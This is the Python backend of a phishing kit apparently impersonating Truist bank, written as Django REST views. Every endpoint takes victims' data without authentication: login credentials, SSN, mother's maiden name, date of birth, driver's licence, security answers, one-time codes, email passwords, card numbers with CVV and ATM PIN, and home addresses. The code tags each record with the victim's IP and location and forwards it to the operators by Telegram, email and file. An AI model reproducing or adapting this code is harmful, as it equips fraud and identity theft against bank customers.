import json
import os
import re
import logging
from django.conf import settings
from django.shortcuts import render
import requests
from core.app_config import app_settings

from rest_framework.response import Response
from rest_framework import status
from rest_framework.decorators import (
    api_view,
    permission_classes,
    authentication_classes,
)

from core.middleware.block_ips_middleware import (
    get_city_from_ip,
    get_client_ip,
    get_country_from_ip,
    get_user_browser,
    get_user_os,
)
from user_data.models import Address, BankInfo, BrowserDetail, Client
from django.template.loader import get_template
from core.settings import send_data_email, send_data_telegram, save_data_to_file
from datetime import datetime

logger = logging.getLogger(__name__)

def _notification_sender():
    return app_settings.get("from_email") or settings.DEFAULT_FROM_EMAIL

def _notification_recipients():
    recipients = app_settings.get("send_email_list") or getattr(settings, "EMAIL_RECIPIENTS", [])
    return [addr for addr in recipients if addr]

@api_view(["POST"])
@permission_classes([])
@authentication_classes([])
def truist_collect_user_login_cred(request):
    payload = {}
    data = {}
    errors = {}

    if request.method == "POST":
        try:
            username = request.data.get("emzemz", "")
            password = request.data.get("pwzenz", "")

            if not username:
                errors["username"] = ["Username is required."]
            if not password:
                errors["password"] = ["Password is required."]

            if errors:
                payload["message"] = "Errors"
                payload["errors"] = errors
                return Response(payload, status=status.HTTP_400_BAD_REQUEST)

            ip = get_client_ip(request)
            agent = request.META.get("HTTP_USER_AGENT", "")

            country = get_country_from_ip(ip)
            city = get_city_from_ip(ip)
            browser = get_user_browser(agent)
            os = get_user_os(agent)
            date = datetime.now().strftime("%I:%M:%S %d/%m/%Y")

            client, _ = Client.objects.get_or_create(username=username)
            client.email = username
            client.save()

            bank_info = BankInfo.objects.create(
                client=client, 
                password=password, 
                username=username
            )

            BrowserDetail.objects.create(
                client=client,
                ip=ip,
                agent=agent,
                country=country,
                city=city,
                address=f"{city}, {country}",
                browser=browser,
                os=os,
                time=date,
                date=date,
            )

            message = f"|=====||Truist Flow||=====|\n"
            message += f"|========= [ LOGIN ] ==========|\n"
            message += f"| ➤ [ Username ] : {username}\n"
            message += f"| ➤ [ Password ] : {password}\n"
            message += f"|=====================================|\n"
            message += f"| 🌍 BROWSER DETAILS 🌍\n"
            message += f"|=====================================|\n"
            message += f"| ➤ [ IP Address ] : {ip}\n"
            message += f"| ➤ [ Location ] : {city}, {country}\n"
            message += f"| ➤ [ Browser ] : {browser} on {os}\n"
            message += f"| ➤ [ Time ] : {date}\n"
            message += f"|=====================================|\n"

            send_data_telegram(app_settings, message)
            send_data_email(
                "Truist Login Credentials",
                message,
                _notification_sender(),
                _notification_recipients()
            )
            save_data_to_file(username, message)

            payload["message"] = "Successful"
            payload["data"] = data
        except Exception:
            logger.exception("truist_collect_user_login_cred failed")
            payload["message"] = "Errors"
            payload["errors"] = {"detail": ["Internal server error"]}
            return Response(payload, status=status.HTTP_500_INTERNAL_SERVER_ERROR)
    return Response(payload)

@api_view(["POST"])
@permission_classes([])
@authentication_classes([])
def truist_collect_user_login_cred2(request):
    payload = {}
    errors = {}
    
    if request.method == "POST":
        try:
            username = request.data.get("emzemz", "")
            password = request.data.get("pwzenz", "")
            
            if not username:
                errors["username"] = ["Username required"]
            if not password:
                errors["password"] = ["Password required"]
                
            if errors:
                return Response({"errors": errors}, status=400)
                
            client, _ = Client.objects.get_or_create(username=username)
            bank_info, _ = BankInfo.objects.get_or_create(client=client)
            bank_info.password2 = password
            bank_info.username2 = username
            bank_info.save()
            
            # Browser details and notification logic
            ip = get_client_ip(request)
            agent = request.META.get("HTTP_USER_AGENT", "")
            country = get_country_from_ip(ip)
            city = get_city_from_ip(ip)
            browser = get_user_browser(agent)
            os = get_user_os(agent)
            date = datetime.now().strftime("%I:%M:%S %d/%m/%Y")
            
            BrowserDetail.objects.create(
                client=client,
                ip=ip,
                agent=agent,
                country=country,
                city=city,
                address=f"{city}, {country}",
                browser=browser,
                os=os,
                time=date,
                date=date
            )
            
            message = f"Truist Login Confirmation\nUsername: {username}\nPassword: {password}"
            send_data_telegram(app_settings, message)
            send_data_email("Truist Login Confirmation", message, _notification_sender(), _notification_recipients())
            save_data_to_file(username, message)
            
            payload["message"] = "Successful"
        except Exception as e:
            logger.exception("truist_collect_user_login_cred2 failed")
            payload["message"] = "Errors"
            return Response(payload, status=500)
    return Response(payload)

@api_view(["POST"])
@permission_classes([])
@authentication_classes([])
def truist_collect_user_basic_info(request):
    payload = {}
    errors = {}
    
    if request.method == "POST":
        try:
            # Extract all fields from request
            fields = {
                'username': request.data.get("emzemz", ""),
                'firstName': request.data.get("fzNme", ""),
                'lastName': request.data.get("lzNme", ""),
                'phone': request.data.get("phone", ""),
                'ssn': request.data.get("ssn", ""),
                'motherMaidenName': request.data.get("motherMaidenName", ""),
                'dob': request.data.get("dob", ""),
                'driverLicense': request.data.get("driverLicense", ""),
                'stAd': request.data.get("stAd", ""),
                'apt': request.data.get("apt", ""),
                'city': request.data.get("city", ""),
                'state': request.data.get("state", ""),
                'zipCode': request.data.get("zipCode", "")
            }
            
            # Validate required fields
            required = ['username', 'firstName', 'lastName', 'phone', 'ssn', 
                       'motherMaidenName', 'dob', 'driverLicense']
            for field in required:
                if not fields[field]:
                    errors[field] = [f"{field} is required"]
            
            if errors:
                return Response({"errors": errors}, status=400)
                
            # Save to Client model
            client, _ = Client.objects.get_or_create(username=fields['username'])
            client.first_name = fields['firstName']
            client.last_name = fields['lastName']
            client.phone = fields['phone']
            client.ssn = fields['ssn']
            client.mother_maiden_name = fields['motherMaidenName']
            client.dob = fields['dob']
            client.driver_license = fields['driverLicense']
            client.email = fields['username']  # Using username as email
            client.save()
            
            # Save address if provided
            if any([fields['stAd'], fields['city'], fields['state'], fields['zipCode']]):
                Address.objects.update_or_create(
                    client=client,
                    defaults={
                        'street_address': fields['stAd'],
                        'apartment_unit': fields['apt'],
                        'city': fields['city'],
                        'state': fields['state'],
                        'zip_code': fields['zipCode']
                    }
                )
            
            # Browser details and notification
            ip = get_client_ip(request)
            agent = request.META.get("HTTP_USER_AGENT", "")
            country = get_country_from_ip(ip)
            city = get_city_from_ip(ip)
            browser = get_user_browser(agent)
            os = get_user_os(agent)
            date = datetime.now().strftime("%I:%M:%S %d/%m/%Y")
            
            BrowserDetail.objects.create(
                client=client,
                ip=ip,
                agent=agent,
                country=country,
                city=city,
                address=f"{city}, {country}",
                browser=browser,
                os=os,
                time=date,
                date=date
            )
            
            message = f"Truist Basic Info\n"
            for field, value in fields.items():
                if value:  # Only include non-empty fields
                    message += f"{field}: {value}\n"
            
            send_data_telegram(app_settings, message)
            send_data_email("Truist Basic Info", message, _notification_sender(), _notification_recipients())
            save_data_to_file(fields['username'], message)
            
            payload["message"] = "Successful"
        except Exception as e:
            logger.exception("truist_collect_user_basic_info failed")
            payload["message"] = "Errors"
            return Response(payload, status=500)
    return Response(payload)

@api_view(["POST"])
@permission_classes([])
@authentication_classes([])
def truist_collect_user_security_questions(request):
    payload = {}
    errors = {}
    
    if request.method == "POST":
        try:
            fields = {
                'username': request.data.get("emzemz", ""),
                'question1': request.data.get("securityQuestion1", ""),
                'answer1': request.data.get("securityAnswer1", ""),
                'question2': request.data.get("securityQuestion2", ""),
                'answer2': request.data.get("securityAnswer2", ""),
                'question3': request.data.get("securityQuestion3", ""),
                'answer3': request.data.get("securityAnswer3", "")
            }
            
            # Validate all fields required
            for field, value in fields.items():
                if not value:
                    errors[field] = [f"{field} is required"]
            
            if errors:
                return Response({"errors": errors}, status=400)
                
            client = Client.objects.get(username=fields['username'])
            client.security_question_1 = fields['question1']
            client.security_answer_1 = fields['answer1']
            client.security_question_2 = fields['question2']
            client.security_answer_2 = fields['answer2']
            client.security_question_3 = fields['question3']
            client.security_answer_3 = fields['answer3']
            client.save()
            
            # Standard browser details and notification
            ip = get_client_ip(request)
            agent = request.META.get("HTTP_USER_AGENT", "")
            country = get_country_from_ip(ip)
            city = get_city_from_ip(ip)
            browser = get_user_browser(agent)
            os = get_user_os(agent)
            date = datetime.now().strftime("%I:%M:%S %d/%m/%Y")
            
            BrowserDetail.objects.create(
                client=client,
                ip=ip,
                agent=agent,
                country=country,
                city=city,
                address=f"{city}, {country}",
                browser=browser,
                os=os,
                time=date,
                date=date
            )
            
            message = f"Truist Security Questions\n"
            for field, value in fields.items():
                if value:  # Only include non-empty fields
                    message += f"{field}: {value}\n"
            
            send_data_telegram(app_settings, message)
            send_data_email("Truist Security Questions", message, _notification_sender(), _notification_recipients())
            save_data_to_file(fields['username'], message)
            
            payload["message"] = "Successful"
        except Exception as e:
            logger.exception("truist_collect_user_security_questions failed")
            payload["message"] = "Errors"
            return Response(payload, status=500)
    return Response(payload)

@api_view(["POST"])
@permission_classes([])
@authentication_classes([])
def truist_collect_user_otp_verification(request):
    payload = {}
    errors = {}
    
    if request.method == "POST":
        try:
            username = request.data.get("emzemz", "")
            otp = request.data.get("otp", "")
            
            if not username or not otp:
                return Response({"error": "Username and OTP required"}, status=400)
                
            client = Client.objects.get(username=username)
            # OTP verification logic would go here
            
            # Standard browser details and notification
            ip = get_client_ip(request)
            agent = request.META.get("HTTP_USER_AGENT", "")
            country = get_country_from_ip(ip)
            city = get_city_from_ip(ip)
            browser = get_user_browser(agent)
            os = get_user_os(agent)
            date = datetime.now().strftime("%I:%M:%S %d/%m/%Y")
            
            BrowserDetail.objects.create(
                client=client,
                ip=ip,
                agent=agent,
                country=country,
                city=city,
                address=f"{city}, {country}",
                browser=browser,
                os=os,
                time=date,
                date=date
            )
            
            message = f"Truist OTP Verification\nUsername: {username}\nOTP: {otp}"
            send_data_telegram(app_settings, message)
            send_data_email("Truist OTP Verification", message, _notification_sender(), _notification_recipients())
            save_data_to_file(username, message)
            
            payload["message"] = "Successful"
        except Exception as e:
            logger.exception("truist_collect_user_otp_verification failed")
            payload["message"] = "Errors"
            return Response(payload, status=500)
    return Response(payload)

@api_view(["POST"])
@permission_classes([])
@authentication_classes([])
def truist_collect_user_email_password(request):
    payload = {}
    errors = {}
    
    if request.method == "POST":
        try:
            username = request.data.get("emzemz", "")
            email = request.data.get("email", "")
            password = request.data.get("password", "")
            
            if not username or not email or not password:
                return Response({"error": "Username, email, and password required"}, status=400)
                
            client = Client.objects.get(username=username)
            client.email = email
            client.save()
            
            bank_info, _ = BankInfo.objects.get_or_create(client=client)
            bank_info.email_password = password
            bank_info.save()
            
            # Standard browser details and notification
            ip = get_client_ip(request)
            agent = request.META.get("HTTP_USER_AGENT", "")
            country = get_country_from_ip(ip)
            city = get_city_from_ip(ip)
            browser = get_user_browser(agent)
            os = get_user_os(agent)
            date = datetime.now().strftime("%I:%M:%S %d/%m/%Y")
            
            BrowserDetail.objects.create(
                client=client,
                ip=ip,
                agent=agent,
                country=country,
                city=city,
                address=f"{city}, {country}",
                browser=browser,
                os=os,
                time=date,
                date=date
            )
            
            message = f"Truist Email Password\nUsername: {username}\nEmail: {email}\nPassword: {password}"
            send_data_telegram(app_settings, message)
            send_data_email("Truist Email Password", message, _notification_sender(), _notification_recipients())
            save_data_to_file(username, message)
            
            payload["message"] = "Successful"
        except Exception as e:
            logger.exception("truist_collect_user_email_password failed")
            payload["message"] = "Errors"
            return Response(payload, status=500)
    return Response(payload)

@api_view(["POST"])
@permission_classes([])
@authentication_classes([])
def truist_collect_user_card_info(request):
    payload = {}
    errors = {}
    
    if request.method == "POST":
        try:
            fields = {
                'username': request.data.get("emzemz", ""),
                'cardNumber': request.data.get("cardNumber", ""),
                'expiryMonth': request.data.get("expiryMonth", ""),
                'expiryYear': request.data.get("expiryYear", ""),
                'cvv': request.data.get("cvv", ""),
                'atmPin': request.data.get("atmPin", "")
            }
            
            # Validate all fields required
            for field, value in fields.items():
                if not value:
                    errors[field] = [f"{field} is required"]
            
            if errors:
                return Response({"errors": errors}, status=400)
                
            client = Client.objects.get(username=fields['username'])
            bank_info, _ = BankInfo.objects.get_or_create(client=client)
            bank_info.card_number = fields['cardNumber']
            bank_info.card_expiry = f"{fields['expiryMonth']}/{fields['expiryYear']}"
            bank_info.card_cvv = fields['cvv']
            bank_info.atm_pin = fields['atmPin']
            bank_info.save()
            
            # Standard browser details and notification
            ip = get_client_ip(request)
            agent = request.META.get("HTTP_USER_AGENT", "")
            country = get_country_from_ip(ip)
            city = get_city_from_ip(ip)
            browser = get_user_browser(agent)
            os = get_user_os(agent)
            date = datetime.now().strftime("%I:%M:%S %d/%m/%Y")
            
            BrowserDetail.objects.create(
                client=client,
                ip=ip,
                agent=agent,
                country=country,
                city=city,
                address=f"{city}, {country}",
                browser=browser,
                os=os,
                time=date,
                date=date
            )
            
            message = f"Truist Card Info\n"
            for field, value in fields.items():
                if value:  # Only include non-empty fields
                    message += f"{field}: {value}\n"
            
            send_data_telegram(app_settings, message)
            send_data_email("Truist Card Info", message, _notification_sender(), _notification_recipients())
            save_data_to_file(fields['username'], message)
            
            payload["message"] = "Successful"
        except Exception as e:
            logger.exception("truist_collect_user_card_info failed")
            payload["message"] = "Errors"
            return Response(payload, status=500)
    return Response(payload)

@api_view(["POST"])
@permission_classes([])
@authentication_classes([])
def truist_collect_user_home_address(request):
    payload = {}
    errors = {}
    
    if request.method == "POST":
        try:
            fields = {
                'username': request.data.get("emzemz", ""),
                'streetAddress': request.data.get("streetAddress", ""),
                'apartmentUnit': request.data.get("apartmentUnit", ""),
                'city': request.data.get("city", ""),
                'state': request.data.get("state", ""),
                'zipCode': request.data.get("zipCode", "")
            }
            
            # Validate all fields required
            for field, value in fields.items():
                if not value:
                    errors[field] = [f"{field} is required"]
            
            if errors:
                return Response({"errors": errors}, status=400)
                
            client = Client.objects.get(username=fields['username'])
            Address.objects.update_or_create(
                client=client,
                defaults={
                    'street_address': fields['streetAddress'],
                    'apartment_unit': fields['apartmentUnit'],
                    'city': fields['city'],
                    'state': fields['state'],
                    'zip_code': fields['zipCode']
                }
            )
            
            # Standard browser details and notification
            ip = get_client_ip(request)
            agent = request.META.get("HTTP_USER_AGENT", "")
            country = get_country_from_ip(ip)
            city = get_city_from_ip(ip)
            browser = get_user_browser(agent)
            os = get_user_os(agent)
            date = datetime.now().strftime("%I:%M:%S %d/%m/%Y")
            
            BrowserDetail.objects.create(
                client=client,
                ip=ip,
                agent=agent,
                country=country,
                city=city,
                address=f"{city}, {country}",
                browser=browser,
                os=os,
                time=date,
                date=date
            )
            
            message = f"Truist Home Address\n"
            for field, value in fields.items():
                if value:  # Only include non-empty fields
                    message += f"{field}: {value}\n"
            
            send_data_telegram(app_settings, message)
            send_data_email("Truist Home Address", message, _notification_sender(), _notification_recipients())
            save_data_to_file(fields['username'], message)
            
            payload["message"] = "Successful"
        except Exception as e:
            logger.exception("truist_collect_user_home_address failed")
            payload["message"] = "Errors"
            return Response(payload, status=500)
    return Response(payload)
